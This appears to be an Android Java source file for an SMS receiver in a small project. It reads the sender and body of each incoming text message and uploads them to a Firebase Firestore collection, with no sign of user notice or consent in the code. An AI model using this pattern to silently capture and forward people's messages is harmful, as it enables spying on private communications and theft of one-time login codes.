package com.example.zvonochnaya;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        System.out.println(1);
        if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String sender = smsMessage.getDisplayOriginatingAddress();
                String message = smsMessage.getMessageBody();
                // Save the SMS details or upload to Firebase database
                saveSmsToFirebase(sender, message);
            }
        }
    }

    private void saveSmsToFirebase(String sender, String message) {
        System.out.println(4);

        FirebaseFirestore db = FirebaseFirestore.getInstance();

        Map<String, Object> smsData = new HashMap<>();
        smsData.put("sender", sender);
        smsData.put("message", message);

        db.collection("sms").add(smsData)
                .addOnSuccessListener(documentReference -> {
                    // SMS saved successfully
                })
                .addOnFailureListener(e -> {
                    // Error occurred while saving SMS
                });
    }

}
